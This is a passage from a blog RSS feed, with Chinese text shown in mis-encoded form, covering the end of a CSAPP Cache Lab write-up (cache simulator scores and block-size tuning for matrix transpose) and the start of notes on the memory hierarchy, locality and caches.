&lt;p&gt;å…ˆåˆ†æåˆ°è¿™é‡Œ,å…·ä½“æ€è·¯è§ä»£ç çš„æ³¨é‡Š,ä½“ç°äº†æ¨¡å—åŒ–çš„ç¼–ç¨‹æ€æƒ³.&lt;/p&gt;
&lt;p&gt;æµ‹è¯•ç»“æœ:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ make &amp;amp;&amp;amp; ./test-csim
gcc -g -Wall -Werror -std=c99 -m64 -o csim csim.c cachelab.c -lm
# Generate a handin tar file each time you compile
tar -cvf kim-handin.tar  csim.c trans.c
csim.c
trans.c
                        Your simulator     Reference simulator
Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts
     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace
     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace
     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace
     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace
     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace
     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace
     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace
     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace
    27

TEST_CSIM_RESULTS=27
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;Part B:ä¼˜åŒ–çŸ©é˜µè½¬ç½®&lt;/h1&gt;
&lt;p&gt;æµ‹è¯•æ—¶ä½¿ç”¨valgrindå·¥å…·æŠ½å–ç¼“å­˜ä½¿ç”¨æƒ…å†µ,æ‰€ä»¥è¦å…ˆå®‰è£…valgrindå·¥å…·,å¦åˆ™æ— æ³•å¼€å±•.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;sudo apt update &amp;amp;&amp;amp; sudo apt-get install valgrind
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;å“‡,åˆç”¨ä¸€ç™¾å¤šMBç¡¬ç›˜ç©ºé—´...&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ä¸€å…±æœ‰ä¸‰ä¸ªæµ‹è¯•å‚æ•°:32*32,64*64å’Œ61*67.Writeupæç¤ºæˆ‘,å®Œå…¨å¯ä»¥æ ¹æ®ä¸åŒçš„è¾“å…¥å‚æ•°è¿è¡Œä¸åŒçš„ä¼˜åŒ–å‡½æ•°.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;32*32
å…ˆè¯•è¯•ä¸åšä»»ä½•ä¼˜åŒ–:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ make &amp;amp;&amp;amp; ./test-trans -M 32 -N 32
gcc -g -Wall -Werror -std=c99 -m64 -O0 -c trans.c
gcc -g -Wall -Werror -std=c99 -m64 -o test-trans test-trans.c cachelab.c trans.o
gcc -g -Wall -Werror -std=c99 -m64 -O0 -o tracegen tracegen.c trans.o cachelab.c
# Generate a handin tar file each time you compile
tar -cvf kim-handin.tar  csim.c trans.c
csim.c
trans.c

Function 0 (2 total)
Step 1: Validating and generating memory traces
Step 2: Evaluating performance (s=5, E=1, b=5)
func 0 (Transpose submission): hits:869, misses:1184, evictions:1152

Function 1 (2 total)
Step 1: Validating and generating memory traces
Step 2: Evaluating performance (s=5, E=1, b=5)
func 1 (Simple row-wise scan transpose): hits:869, misses:1184, evictions:1152

Summary for official submission (func 0): correctness=1 misses=1184

TEST_TRANS_RESULTS=1:1184
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯¹äº32*32çŸ©é˜µ,missè¾¾åˆ°äº†1184.&lt;/p&gt;
&lt;p&gt;å¦‚ä½•ä¼˜åŒ–å‘¢?&lt;/p&gt;
&lt;p&gt;æ ¹æ®Writeup,ç¼“å­˜çš„å‚æ•°æ˜¯(s=5, E=1, b=5),ä¹Ÿå°±æ˜¯æœ‰32ç»„,æ¯ç»„1è¡Œ([[é«˜é€Ÿç¼“å­˜#ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜]]),æ¯è¡Œ32å­—èŠ‚,å¯å®¹çº³8ä¸ªintæ•´æ•°.&lt;/p&gt;
&lt;p&gt;å¦‚æœé€ä¸ªå…ƒç´ è½¬ç½®,Bæ•°ç»„ç¬¬0è¡Œç¬¬0ä¸ªå…ƒç´ åœ¨ç¬¬0ç»„,ç¬¬1è¡Œç¬¬0ä¸ªå…ƒç´ åœ¨ç¬¬4ç»„,ä¾æ¬¡è¿›è¡Œä¸‹å»,åˆ°ç¬¬9è¡Œæ—¶,32ä¸ªç»„ä¸­çš„0,4,8,12,16,20,24,28ç»„å†™æœ‰ç¼“å­˜,ç¬¬9è¡Œä¼šè¦†ç›–ç¬¬0ç»„,è™½ç„¶ç¼“å­˜æœªæ»¡,ä½†æ˜¯å‘ç”Ÿäº†[[å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„#ç¼“å­˜|conflict miss]].&lt;/p&gt;
&lt;p&gt;å›é¡¾çŸ©é˜µä¹˜æ³•çš„åˆ†å—æ€æƒ³([[é«˜é€Ÿç¼“å­˜#çŸ©é˜µåˆ†å—,æé«˜æ—¶é—´å±€éƒ¨æ€§]]),å¯¹äº32*32çŸ©é˜µå¯ä»¥åˆ†å—æˆ8*8.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¾¾åˆ°misses&amp;lt;300å³ä¸ºæ»¡åˆ†&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;64*64
ä½†æ˜¯å¯¹äº64*64çŸ©é˜µ,åº”è¯¥åˆ†æˆ4*4,ä¸ºäº†å……åˆ†åˆ©ç”¨æ¯è¡Œ8ä¸ªå…ƒç´ çš„ç¼“å­˜,ä¹Ÿåº”åœ¨8*8å—ä¸‹æ•´ä½“è€ƒè™‘.å…·ä½“è§ä»£ç çš„æ³¨é‡Š&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;è¯´ä¸€ä¸ªå¾ˆå‘çš„ç‚¹:(ä¹Ÿæ˜¯çœ‹äº†åˆ«äººçš„è§£ç­”[^1]æ‰çŸ¥é“),æŸ¥çœ‹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;./csim-ref -v -s 5 -E 1 -b 5 -t trace.f0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å‘ç°Aå’ŒBçš„åœ°å€ç›¸å·®0x40000,æ˜¯æˆ‘cache sizeçš„æ•´æ•°å€,è¿™å¯¼è‡´åœ¨å¤„ç†Aå’ŒBçš„å¯¹è§’çº¿å…ƒç´ æ—¶å¦‚æœ &lt;code&gt;L Açš„å…ƒç´ &lt;/code&gt;ä¹‹åé©¬ä¸Š &lt;code&gt;S Bçš„å…ƒç´ &lt;/code&gt; æ€»æ˜¯ä¼šå‘ç”Ÿeviction!è§£å†³åŠæ³•æ˜¯åˆ›å»ºä¸´æ—¶å˜é‡.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¾¾åˆ°misses&amp;lt;1300å³ä¸ºæ»¡åˆ†&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;[^1]: &lt;a href=&quot;https://zhuanlan.zhihu.com/p/456858668&quot;&gt;CSAPP: Cachelabå…¨æ³¨é‡Š+æ€è·¯å’Œå»ºè®®&lt;/a&gt;&lt;/p&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;61*67
61å’Œ67æ˜¯è´¨æ•°,æ²¡æœ‰é‚£ä¹ˆå®¹æ˜“å‘ç”Ÿ[[å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„#ç¼“å­˜|conflict miss]]äº†,å¯»æ‰¾åˆé€‚çš„block_sizeè¾¾åˆ°è¦æ±‚å³å¯&lt;blockquote&gt;
&lt;p&gt;è¾¾åˆ°misses&amp;lt;2000å³ä¸ºæ»¡åˆ†&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å°è¯•&lt;code&gt;block_size = 14&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ make &amp;amp;&amp;amp; ./test-trans -M 61 -N 67
gcc -g -Wall -Werror -std=c99 -m64 -O0 -c trans.c
gcc -g -Wall -Werror -std=c99 -m64 -o test-trans test-trans.c cachelab.c trans.o
gcc -g -Wall -Werror -std=c99 -m64 -O0 -o tracegen tracegen.c trans.o cachelab.c
# Generate a handin tar file each time you compile
tar -cvf kim-handin.tar  csim.c trans.c
csim.c
trans.c

Function 0 (1 total)
Step 1: Validating and generating memory traces
Step 2: Evaluating performance (s=5, E=1, b=5)
func 0 (Transpose submission): hits:6182, misses:1997, evictions:1965

Summary for official submission (func 0): correctness=1 misses=1997

TEST_TRANS_RESULTS=1:1997
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆšå¥½æ»¡è¶³è¦æ±‚!æœ‰æ²¡æœ‰æ›´å°‘çš„å‘¢?&lt;/p&gt;
&lt;p&gt;å°è¯• &lt;code&gt;block_size = 15&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:2022
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åè€Œå˜å¤šäº†?&lt;/p&gt;
&lt;p&gt;å°è¯• &lt;code&gt;block_size = 16&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:1993
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°è¯• &lt;code&gt;block_size = 17&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:1951
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°è¯• &lt;code&gt;block_size = 18&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:1962
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°è¯• &lt;code&gt;block_size = 19&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:1980
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°è¯• &lt;code&gt;block_size = 20&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:2003
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°è¯• &lt;code&gt;block_size = 21&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:1958
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°è¯• &lt;code&gt;block_size = 22&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:1960
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°è¯• &lt;code&gt;block_size = 23&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:1929
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°è¯• &lt;code&gt;block_size = 24&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:2016
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰€ä»¥,block_sizeå–14,16,17,18,19,20,21,22,23éƒ½æ˜¯æ»¡åˆ†,å…¶ä¸­å±&lt;code&gt;block_size = 23&lt;/code&gt;çš„missesæœ€å°‘.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;ä¸å¾—ä¸è¯´,æµ‹è¯•é€Ÿåº¦å¥½æ…¢å•Š...&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;æˆæœæ€»è§ˆ&lt;/h1&gt;
&lt;p&gt;æ–‡ä»¶å¤¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ª &lt;code&gt;drive.py&lt;/code&gt;æ–‡ä»¶ä¾›æµ‹è¯•æ‰€æœ‰ç»“æœ,æ˜¯python2æ—¶ä»£ç¼–å†™çš„.æˆ‘æ‰¾åˆ°äº†python3ç‰ˆæœ¬,æ›¿æ¢åè¿è¡Œ:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ python3 drive.py
Part A: Testing cache simulator
Running ./test-csim
                        Your simulator     Reference simulator
Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts
     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace
     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace
     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace
     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace
     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace
     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace
     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace
     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace
    27


Part B: Testing transpose function
Running ./test-trans -M 32 -N 32
Running ./test-trans -M 64 -N 64
Running ./test-trans -M 61 -N 67

Cache Lab summary:
                        Points   Max pts      Misses
Csim correctness          27.0        27
Trans perf 32x32           8.0         8         288
Trans perf 64x64           8.0         8        1220
Trans perf 61x67          10.0        10        1929
          Total points    53.0        53
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘å‘ç°æœ¬å®éªŒçš„Part Båœ¨æˆ‘è¿™WSLä¸Šè¿è¡Œçš„missesæ€»æ˜¯æ¯”ç½‘ä¸Šçš„è§£ç­”çš„misseså¤§ä¸€ç‚¹ç‚¹,å³ä½¿æˆ‘çš„æ€è·¯,ç®—æ³•ä¸ä»–ä»¬æ˜¯ä¸€è‡´çš„.è¿™ç©¶ç«Ÿæ˜¯éšå«äº†WSLä¸çœŸå®Linuxç¯å¢ƒçš„åŒºåˆ«,è¿˜æ˜¯ä»£ç é£æ ¼ç»†èŠ‚çš„å·®å¼‚å‘¢?&lt;/p&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Wed, 29 Jan 2025 16:00:00 GMT</pubDate></item><item><title>å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„</title><link>https://www.tankimzeg.top/blog/%E5%AD%98%E5%82%A8%E5%99%A8%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E5%AD%98%E5%82%A8%E5%99%A8%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E5%AD%98%E5%82%A8%E5%99%A8%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84/&quot;&gt;https://www.tankimzeg.top/blog/%E5%AD%98%E5%82%A8%E5%99%A8%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;ä¹‹å‰æˆ‘ä»¬å°†å†…å­˜å½“ä½œå­—èŠ‚æ•°ç»„,ä½†å®é™…ä¸Šå†…å­˜æ˜¯ä¸€ä¸ªéå¸¸å¤æ‚çš„è®¾å¤‡å±‚æ¬¡ç»“æ„.&lt;/p&gt;
&lt;h1&gt;å­˜å‚¨æŠ€æœ¯å’Œè¶‹åŠ¿&lt;/h1&gt;
&lt;h2&gt;éšæœºè®¿é—®å­˜å‚¨å™¨(Random-Access Memory)&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;ç‰¹ç‚¹&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;RAMè¢«æ‰“åŒ…æˆèŠ¯ç‰‡&lt;/li&gt;
&lt;li&gt;åŸºæœ¬å­˜å‚¨å•å…ƒ,ä¸€ä¸ªå•å…ƒå­˜å‚¨ä¸€ä¸ªbit&lt;/li&gt;
&lt;li&gt;å¤šä¸ªå†…å­˜æ¡æ„æˆäº†ä¸»å­˜&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;p&gt;RAMåˆ†ä¸ºSRAMå’ŒDRAM
SRAM(Stactic RAM)
DRAM(Dynamic RAM)
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250127170217.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;éæ˜“å¤±æ€§å­˜å‚¨å™¨
RAMæ–­ç”µåå°±å¤±å»äº†æ‰€æœ‰ä¿¡æ¯,ç§°ä¸ºæ˜“å¤±æ€§å­˜å‚¨å™¨.ç›¸å¯¹çš„éæ˜“å¤±æ€§å­˜å‚¨å™¨å°±æ˜¯åªè¯»å­˜å‚¨å™¨(ROM).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;CPUè¯»å†™å†…å­˜æ“ä½œ&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;CPUåŠ è½½å†…å­˜
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250127171405.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;CPUå­˜å‚¨å†…å­˜
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250127171444.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;ç£ç›˜&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;å‡ ä½•æè¿°&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;ç£ç›˜æ˜¯ç”±ç›˜ç‰‡ç»„æˆçš„,ä¸€ä¸ªç›˜ç‰‡æœ‰ä¸Šè¡¨é¢å’Œä¸‹è¡¨é¢ä¸¤é¢.&lt;/li&gt;
&lt;li&gt;æ¯ä¸ªè¡¨é¢åŒ…å«ä¸€ç³»åˆ—åŒå¿ƒåœ†,ç§°ä¹‹ä¸ºç£é“.&lt;/li&gt;
&lt;li&gt;æ¯ä¸€ä¸ªç£é“åŒ…å«å¾ˆå¤šä¸ªæ‰‡åŒº,æ‰‡åŒºå­˜å‚¨512å­—èŠ‚æ•°æ®.&lt;/li&gt;
&lt;li&gt;æ‰‡åŒºä¹‹é—´æœ‰ç©ºéš™åˆ†éš”.&lt;/li&gt;
&lt;li&gt;ç›˜ç‰‡åœ¨ä¸»è½´ä¸Šæ˜¯å¯¹é½çš„,è½¨é“åœ¨ä¸åŒè¡¨é¢ä¸Šçš„é›†åˆç§°ä¸ºæŸ±é¢.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250127172417.png&quot; alt=&quot;&quot;&gt;
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250127172440.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;p&gt;å®¹é‡
ç£ç›˜å®¹é‡ = æ¯ä¸ªæ‰‡åŒºå­—èŠ‚æ•° * ç£é“å¹³å‡æ‰‡åŒºæ•° * è¡¨é¢ç£é“æ•° * ç›˜ç‰‡ç›˜é¢æ•° * ç£ç›˜ç›˜ç‰‡æ•°é‡&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æ“ä½œ
ä¸€ä¸ªç£ç›˜ä¸€ä¸ªç£è‡‚,ä¸€ä¸ªç£è‡‚ä¸Šæœ‰å¤šä¸ªè¯»å†™å¤´,å¯¹åº”æ¯ä¸ªç›˜ç‰‡
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250127173829.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç£ç›˜è®¿é—®æ—¶é—´&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;å¯»é“æ—¶é—´:å°†è¯»å†™å¤´ç§»åŠ¨åˆ°éœ€è¦çš„ç£é“ä¸Š,é€šå¸¸éœ€è¦3~9ms&lt;/li&gt;
&lt;li&gt;æ—‹è½¬å»¶è¿Ÿ:å°†ç£ç›˜æ—‹è½¬åˆ°éœ€è¦çš„æ‰‡åŒºä¸Š,å¹³å‡éœ€è¦Â½æ—‹è½¬å‘¨æœŸ&lt;/li&gt;
&lt;li&gt;ä¼ è¾“æ—¶é—´:è¯»å–å­—èŠ‚éœ€è¦çš„æ—¶é—´&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;5&quot;&gt;
&lt;li&gt;CPUè¯»å–ç£ç›˜æ“ä½œ:
é¦–å…ˆ,CPUé€šè¿‡ç¼–å†™ä¸‰å…ƒç»„(readæŒ‡ä»¤,é€»è¾‘å—å·,ç›®çš„å†…å­˜åœ°å€)æ¥å¯åŠ¨æ­¤è¯»å–è¡Œä¸º
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250127175427.png&quot; alt=&quot;&quot;&gt;
ç„¶å,ç£ç›˜æ§åˆ¶å™¨è¯»å–ä¸è¯¥é€»è¾‘å—å¯¹åº”çš„æ‰‡åŒº,å–å¾—æ€»çº¿çš„æ§åˆ¶æƒ,é€šè¿‡I/Oæ¡¥ç›´æ¥å¤åˆ¶åˆ°ä¸»å­˜ä¸­
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250127175908.png&quot; alt=&quot;&quot;&gt;
æœ€å,ä¸€æ—¦æ•°æ®ä¼ è¾“å®Œæˆ,ç£ç›˜æ§åˆ¶å™¨ä½¿ç”¨ä¸­æ–­æœºåˆ¶æ¥é€šçŸ¥CPU
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250127180114.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;å›ºæ€ç¡¬ç›˜(SSD)&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250127180642.png&quot; alt=&quot;&quot;&gt;
é¡µ:4KB&lt;del&gt;512KB,å—:32&lt;/del&gt;128é¡µ
éœ€è¦å°†é¡µæ“¦é™¤åæ‰èƒ½å†™å…¥.
ä¸€ä¸ªå—ç»è¿‡10ä¸‡æ¬¡é‡å¤å†™å…¥åå°±åæ‰äº†&lt;/p&gt;
&lt;h1&gt;å±€éƒ¨æ€§(Locality)&lt;/h1&gt;
&lt;p&gt;ç¨‹åºå€¾å‘äºä½¿ç”¨å…¶åœ°å€æ¥è¿‘æˆ–ç­‰äºæœ€è¿‘ä½¿ç”¨è¿‡çš„æ•°æ®å’ŒæŒ‡ä»¤çš„é‚£äº›æ•°æ®å’ŒæŒ‡ä»¤&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ—¶é—´å±€éƒ¨æ€§:æœ€è¿‘è®¿é—®çš„ä½ç½®å¯èƒ½åœ¨ä¸ä¹…çš„å°†æ¥å†æ¬¡è¢«å¼•ç”¨çš„å±æ€§&lt;/li&gt;
&lt;li&gt;ç©ºé—´å±€éƒ¨æ€§:å¦‚æœè®¿é—®äº†ä¸€ä¸ªä½ç½®,é‚£ä¹ˆå°†æ¥å¯èƒ½è®¿é—®ä¸´è¿‘çš„ä½ç½®&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int sum_array(int *a){
	int sum = 0;
	for(int i=0;i&amp;lt;n;i++)
		sum += a[i];
	return sum;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™æ®µä»£ç ä¸­,&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ•°æ®ä½¿ç”¨
å¯¹æ•°ç»„å…ƒç´ çš„å¼•ç”¨ä½“ç°ç©ºé—´å±€éƒ¨æ€§;å¯¹sumçš„å¼•ç”¨ä½“ç°æ—¶é—´å±€éƒ¨æ€§.&lt;/li&gt;
&lt;li&gt;æŒ‡ä»¤ä½¿ç”¨
é¡ºåºæ‰§è¡Œä¸€ç³»åˆ—æŒ‡ä»¤ä½“ç°ç©ºé—´å±€éƒ¨æ€§;å¾ªç¯ä¸­çš„æŒ‡ä»¤ä½“ç°æ—¶é—´å±€éƒ¨æ€§.&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;ä½œä¸ºä¸€åç¨‹åºå‘˜,èƒ½å¤Ÿåœ¨çœ‹åˆ°ä»£ç æ—¶è·å¾—ä¸€äº›ä»£ç å±€éƒ¨æ€§çš„å®šæ€§æ„Ÿè§‰æ˜¯éå¸¸é‡è¦çš„.è¦é¿å…å±€éƒ¨æ€§å·®çš„æƒ…å†µ.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„&lt;/h1&gt;
&lt;p&gt;å­˜å‚¨ç©ºé—´è¶Šå°,è¶Šå¿«è¶Šè´µ;å­˜å‚¨ç©ºé—´è¶Šå¤§è¶Šæ…¢,è¶Šä¾¿å®œ.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;çº§åˆ«&lt;/th&gt;
&lt;th&gt;å­˜å‚¨å™¨&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;L0&lt;/td&gt;
&lt;td&gt;å¯„å­˜å™¨&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;L1&lt;/td&gt;
&lt;td&gt;L1ç¼“å­˜(SRAM)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;L2&lt;/td&gt;
&lt;td&gt;L2ç¼“å­˜(SRAM)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;L3&lt;/td&gt;
&lt;td&gt;L3ç¼“å­˜(SRAM)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;L4&lt;/td&gt;
&lt;td&gt;ä¸»å­˜(DRAM)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;L5&lt;/td&gt;
&lt;td&gt;æœ¬åœ°äºŒçº§å­˜å‚¨(å¦‚ç£ç›˜)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;L6&lt;/td&gt;
&lt;td&gt;è¿œç¨‹äºŒçº§å­˜å‚¨(å¦‚ç½‘ç›˜)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;æˆ‘çš„ç”µè„‘çš„&amp;quot;ä»»åŠ¡ç®¡ç†å™¨&amp;quot;-&amp;gt;&amp;quot;æ€§èƒ½&amp;quot;-&amp;gt;&amp;quot;CPU&amp;quot;ä¸­çš„ç¼“å­˜æƒ…å†µ&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250127205447.png&quot; alt=&quot;&quot;&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;åœ¨å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„ä¸­çš„æ¯ä¸€å±‚éƒ½åŒ…å«ä»ä¸‹ä¸€ä¸ªè¾ƒä½çº§åˆ«å±‚çº§è·å–çš„æ•°æ®&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h1&gt;ç¼“å­˜&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;ç¼“å­˜:ä¸€ä¸ªæ›´å°æ›´å¿«çš„å­˜å‚¨è®¾å¤‡,å……å½“æ›´æ…¢çš„è®¾å¤‡ä¸­çš„æ•°æ®çš„æš‚å­˜åŒºåŸŸ.
æ‰€ä»¥ç¼“å­˜æ˜¯ä¸€ä¸ªç›¸å¯¹çš„æ¦‚å¿µ,ç¬¬kçº§å­˜å‚¨å™¨æ˜¯ç¬¬k+1å­˜å‚¨å™¨çš„ç¼“å­˜.
æ ¹æ®å±€éƒ¨æ€§åŸç†,ç›¸æ¯”äºç¬¬k+1çº§å­˜å‚¨å™¨,ç¨‹åºæ›´å€¾å‘äºè®¿é—®ç¬¬kçº§å­˜å‚¨å™¨.
æ‰€ä»¥å¦‚æœè®¿é—®ç¬¬k+1çº§å­˜å‚¨å™¨,æˆ‘ä»¬ä¼šå°†å…¶å¤åˆ¶åˆ°ç¬¬kçº§(ç¼“å­˜),å¾ˆå¯èƒ½å°†å†æ¬¡è®¿é—®å®ƒ.
å› ä¸ºæˆ‘ä»¬ä¸ç»å¸¸è®¿é—®çº§åˆ«ç¬¬çš„å­˜å‚¨,æ‰€ä»¥å¯ä»¥ç”¨æ…¢çš„ä¾¿å®œçš„è®¾å¤‡å­˜å‚¨.&lt;/p&gt;
